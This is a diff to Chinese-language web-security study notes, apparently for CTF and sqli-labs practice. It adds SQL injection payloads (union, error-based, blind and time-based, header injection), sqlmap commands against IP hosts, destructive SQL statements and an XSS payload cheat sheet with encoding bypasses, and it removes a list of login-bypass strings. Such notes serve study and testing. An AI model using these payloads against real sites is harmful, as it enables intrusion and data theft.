@@ -117,11 +117,13 @@ Golang
 
   + 一阶注射
 
-    一阶注射是指输入的注射语句对WEB直接产生了影响，出现了结果；
+    一阶注射是指输入的注射语句对WEB直接产生了影响，出现了结果
 
   + 二阶注射
 
-    二阶注入类似存储型XSS，是指输入提交的语句，无法直接对WEB应用程序产生影响，通过其它的辅助间接的对WEB产生危害，这样的就被称为是二阶注入.
+    二阶注入类似存储型XSS，是指输入提交的语句，无法直接对WEB应用程序产生影响，
+
+    通过其它的辅助间接的对WEB产生危害，这样的就被称为是二阶注入
 
 + 基于注入点的位置上的
   + 通过用户输入的表单域的注射。
@@ -148,17 +150,32 @@ Golang
 select user();							-- 数据库用户名
 select version();						-- MySQL版本
 select database();						-- 数据库名
+select @@basedir;						-- 数据库安装路径
 select @@datadir;						-- 数据库路径
 select @@version_compile_os；		    -- 操作系统版本
 show global variables like '%secure%';	-- 
 if(expr,v1,v2)							-- expr正确则v1，否则v2
+select case when expr then v1 else v2 end;  -- 与 if 功能相同
 select concat('11', '22', '33');		-- 字符串连接 112233
 select concat_ws(x, s1,s2...sn)			-- 以 x 作为连接符，将字符串连接
 select group_concat()							-- 把查询出来的多行连接起来
-select substr(database(), 1, 1)
-select ascii(substr(database()), 1, 1)
+select mid(str, start, count)			-- 从start开始截取count个字符
+select substr(database(), 1, 1)			-- 与mid同
+# 如果用不了逗号，直接 from start for count
+# union select * from (select 1)a join (select 2)b == union select 1,2
+select left(str, count)					-- 截取左边count个字符
+select ord()							-- 返回第一个字符的ASCII码
+select ascii()							-- 与ord同
 select char(32, 58, 32)					-- ' : ' 即空格+ : +空格
 select length(database());
+delete from table_name where id=1;		-- 不加限制条件将删除整张表
+drop database ds_name;
+drop column column_name;
+alter table table_name;
+update table_name set column_name='new' where id=1;  -- 更新
+/*!50000select*/
+where id = 0.1 union select ...
+xor, ||, &&, !, not
 ```
 
 常用语句
@@ -191,6 +208,8 @@ or 1=1--+
 
 总的来说区别并不大，注意构造闭合
 
+
+
 **union 注入**
 
 所查询的字段数需与主查询一致
@@ -201,18 +220,39 @@ or 1=1--+
 union select 1, 2 from user where id = 1 or 1=1
 ```
 
+
+
 **information_schema**
 
 存储数据库信息的数据库
 
+> **数据库名**
+>
+>schemata => schema_name
+>
+>tables => table_schema
+>
+>columns => table_schema
+>
+>**表名**
+>
+>tables => table_name
+>
+>columns => table_name
+>
+>**列名**
+>
+>columns => columns_name
+
 ```sql
-select table_name from information_schema.tables where table_schema="security"; 
---获取security中所有表名
 select 1,group_concat(table_name) from information_schema.tables where table_schema=database() -- 获取当前数据库中所有表
+select 1,group_concat(column_name) from information_schema.columns where table_name=flag; -- 获得所有列名（字段），flag 要hex编码 0x666c6167
 -1′ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #
 -- 下载数据
 -1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #  -- 获取表中的字段名
 ```
+
+
 
 **函数报错信息注入**
 
@@ -227,13 +267,21 @@ and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from inform
 
 基于函数报错信息获取（select, insert, update, delete)
 
+
+
 **insert / update / delete 注入**
 
 结合函数报错信息，将函数插入到语句中
 
+
+
 **http header 注入**
 
+如 `XFF`，`referer`
+
 观察点：后台收集了请求头中的信息，并存入到数据库中
+
+
 
 **布尔盲注**
 
@@ -241,11 +289,26 @@ and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from inform
 
 效率太低，写脚本爆
 
+
+
 **时间盲注**
 
-无显示回显，可在以前的基础上加入 sleep() 语句，若明显延迟，则注入成功
+无显示回显，可在以前的基础上加入 `sleep()` 语句，若明显延迟，则注入成功
 
-BENCHMARK(count,expr) 执行 count次的expr
+`BENCHMARK(count,expr)`  执行 `count` 次的 `expr`
+
+即使 `sleep` 和 `benchmark` 都被过滤了，但是我们依然可以通过让Mysql进行复杂运算，
+
+以达到延时的效果，比如可以用字段比较多的表来计算笛卡尔积
+
+```sql
+select count(*) 
+from information_schema.columns A, 
+information_schema.columns B, 
+information_schema.columns C#
+```
+
+
 
 **利用注入写入后门**
 
@@ -265,20 +328,13 @@ sqlmap -u "http://47.96.118.255:33066/" --forms -D news --tables
 sqlmap -u "http://47.96.118.255:33066/" --forms -D news -T secret_table --dump
 ```
 
-**本质**：把用户输入的数据当代码来执行，违背了“数据与代码分离”的原则。
+**自定义注入位置，如 XFF 注入**
 
-**关键条件**：
-
->1.用户能控制输入的内容
->2.Web 应用执行的代码中，拼接了用户输入的内容
+```shell
+sqlmap -u "http://192.168.118.142/" --headers="X-Forwarded-For: *" --banner
+```
 
 **攻击**：通过构建特殊的输入作为参数传入 Web 应用程序，而这些输入大都是 SQL 语法里的一些组合，通过执行 SQL 语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。
-
-**寻找注入点**
-
-只要在 id 后面输入任意的字符后，`网站页面报错`，则说明有注入。
-
-因为只要网站报错，就说明我们任意输入的字符被带入到数据库查询了，因此我们可以插入恶意的 SQL 语句，注入攻击就这样产生了。
 
 **猜解数据表**
 
@@ -289,38 +345,6 @@ and exists(select * from user)  -- 表存在页面就会返回正常，否则报
 and exists(select * from amdin)
 ```
 
-**猜解数据列**
-
-```sql
-and exists(select password from admin)  -- 存在就返回正常，否则页面报错  aclin
-```
-
-**猜解数据列长度**
-
-```sql
-and (select top 1 len(admin) from admin)>3  -- len() 返回文本字段中值的长度
--- 若 admin 表中 admin 列的长度大于3则返回正常
-```
-
-**猜解数据列内容**
-
-```sql
-and (select top 1 asc(mid(admin,1,1)) from admin)>96
--- 如果 admin 列中的第一个字符的 ASCII 码大于97则返回正常
-SELECT MID(column_name,start[,length]) FROM table_name; -- 从文本字段中提取字符(起始值为1)
-SELECT TOP number|percent column_name(s) FROM table_name;  -- 规定要返回的记录的条数
-```
-
-```shell
-https://sqlwiki.netspi.com/detection#mysql  # 参考网站
-page.asp?id=1 or 1=1 -- true
-page.asp?id=1' or 1=1 -- true
-page.asp?id=1" or 1=1 -- true
-page.asp?id=1 and 1=2 -- false
-
-product.asp?id=1/1 -- true
-product.asp?id=1/0 -- false
-```
 
 **类型**
 
@@ -398,12 +422,9 @@ gbk 双字节编码：一个汉字用两个字节表示，首字节都应 0x81-0
 
 
 # 偏移注入
-1.Union 合并查询需要列相等，顺序一样
 2.select * from admin as inner join 
   index.asp?id=886and 1=2 union select 1,2,3,4,* from(admin as a inner join admin as   b on a.id=b.id)
  查询条件是 a 表的 id 列与 b 表的 id 列相等，返回所有相等的行，显然，a,b都是同一个表，当然全部返回
-
-3.* 代表了所有字段，如查询 admin 表，他有几个字段，* 就代表几个字段
 ```
 
 
@@ -486,56 +507,59 @@ Less-8
 没有任何报错信息，无法直接根据报错注入，时间盲注
 
 ```sql
-id=1' AND SLEEP(5) --+
+id=1' and if(ascii(substr((select username from users limit 0, 1), 1, 1))=68 ,1 , SLEEP(5) --+
 ```
-Less-9
-```sql
+Less-9、Less-10 这两个与 8 类似
 
-```
-Less-10
-```sql
-
-```
 Less-11
-```sql
 
+POST-Error Based - Single quotes
+
+```sql
+uname=-1' union select 1,flag from flag#&passwd=&submit=Submit
 ```
 Less-12
 ```sql
-
+uname=-1") union select 1,flag from flag#&passwd=&submit=Submit
 ```
 Less-13
-```sql
 
+发现有报错信息，尝试报错注入
+
+```sql
+uname=-1') and (extractvalue(1,concat(0x7e,(select flag from flag),0x7e)));%23&passwd=&submit=Submit
 ```
 Less-14
-```sql
 
-```
-Less-15
-```sql
+双引号
 
-```
-Less-16
 ```sql
-
+uname=1" and (extractvalue(1,concat(0x7e,(select flag from flag),0x7e)));%23&passwd=&submit=Submit
 ```
+Less-15 Less-16
+
 Less-17
-```sql
 
+利用 update 注入，有明显的报错信息，可以报错注入，并且没有验证之前的密码
+
+```sql
+uname=admin&passwd=11'and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&submit=Submit
 ```
 Less-18
-```sql
 
+UA 注入，要先登录才有回显，注意闭合
+
+```sql
+' and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and '
 ```
 Less-19
-```sql
 
-```
+Referer 注入
+
 Less-20
-```sql
 
-```
+cookie 注入，同样有报错，改了cookie后不会影响登录状态吗？
+
 Less-21
 ```sql
 
@@ -572,7 +596,6 @@ Less-39
 
 工具：
 
-+   bp
 +   hackbar
 
 +   xss 平台
@@ -587,6 +610,129 @@ Less-39
 +   过滤标签，尝试各种绕过方法
 +   存在安全策略csp等，尝试相应的绕过方法
 +   逆向 .swf 文件，审计源码，构造 xss payload
+
+### 知识点
+
+**同源策略**
+
+何为同源？
+
++ 协议相同（http/https）
++ host 相同
++ 端口相同
+
+#### 常见标签
+
+**`<img>`**
+
+```javascript
+<img src=javascript:alert("xss")>
+<IMG SRC=javascript:alert(String.formCharCode(88, 83, 83))>
+<img src="URL" style='Xss:expression(alert(/xss));'>
+<!--CSS标记xss-->
+<img style="background-image:url(javascript:alert('XSS'))">
+    
+<img src="x" onerror=alert(1)>
+<img src="1" onerror=eval("alert('xss')")>
+    
+<img src=1 onmouseover=alert('xss')>
+```
+
+**`<a>`**
+
+```javascript
+<a href="https://www.baidu.com">baidu</a>
+
+<a href="javascript:alert('xss')">aa</a>
+<a href=javascript:eval(alert('xss'))>aa</a>
+<a href="javascript:aaa" onmouseover="alert(/xss/)">aa</a>
+
+<script>alert('xss')</script>
+<a href="" onclick=alert('xss')>aa</a>
+
+<a href="" onclick=eval(alert('xss'))>aa</a>
+
+<a href=kycg.asp>ttt=1000 onmouseover=prompt('xss') y=2018>aaa</a>
+```
+
+**`input`**
+
+```javascript
+<input name="name" value="">
+    
+<input value="" onclick=alert('xss') type="text">
+    
+<input name="name" value="" onmouseover=prompt('xss') bad="">
+    
+<input name="name" value=""><script>alert('xss')</script>
+```
+
+**`form`**
+
+```javascript
+<form action=javascript:alert('xss') method="get">
+<form action=javascript:alert('xss')>
+    
+<form method=post action=aa.asp? onmouseover=prompt('xss')>
+<form method=post action=aa.asp? onmouseover=alert('xss')>
+<form action=1 onmouseover=alert('xss')>
+    
+<!--原code-->
+<form method=post action="data:text/html;base64,<script>alert('xss')</script>">
+<!--base64编码-->
+<form method=post action="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
+```
+
+**`<iframe>`**
+
+```javascript
+<iframe src=javascript:alert('xss');height=5width=1000 /><iframe>
+    
+<iframe src="data:text/html,&lt;script&gt;alert('xss')&lt;/script&gt;"></iframe>
+<!--原code-->
+<iframe src="data:text/html;base64,<script>alert('xss')</script>">
+<!--base64编码-->
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
+    
+<iframe src="aaa" onmouseover=alert('xss') /><iframe>
+    
+<iframe src="javascript&colon;prompt&lpar;`xss`&rpar;"></iframe>
+```
+
+**`<svg>`**
+
+```javascript
+<svg onload=alert(1)>
+```
+
+#### 编码绕过
+
+**JS编码****
+
+JS提供了四种字符编码的策略，
+
+- 三个八进制数字，如果数字不够，在前面补零，如`a`的编码为`\141`
+- 两个十六进制数字，如果数字不够，在前面补零，如`a`的编码为`\x61`
+- 四个十六进制数字，如果数字不够，在前面补零，如`a`的编码为`\u0061`
+- 对于一些控制字符，使用特殊的C类型的转义风格，如`\n`和`\r`
+
+**HTML实体编码**
+
+以`&`开头，以分号结尾的，即HTML编码，如`<`的编码为`&1t;`
+
+十进制，十六进制的ASCII码或者Unicode字符编码。样式为`&#数值;`
+
+如`<`的编码为`&#60;` (10进制)`&#x003c;` (16进制)
+
+**URL编码**
+
+这里为url全编码，也就是两次url编码
+
+如`alert`的url全编码为`%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34`
+
+**String.fromCharCode编码**
+
+如`alert`的编码为`String.fromCharCode(97,108,101,114,116)`
 
 ## 代码审计
 
@@ -1714,18 +1860,4 @@ mail.taiyangyy.top
 
 ```shell
 http://154.80.253.139/phpMyAdmin/db_create.php  # 与 index.php 同界面
-```
-
-+ 万能密码
-
-```shell
-admin' --
-admin' #
-admin'/*
-admin' or '1'='1
-admin' or '1'='1'--
-admin' or '1'='1'#
-admin' or '1'='1'/*
-admin'or 1=1 or ''='
-admin' or 1=1
 ```
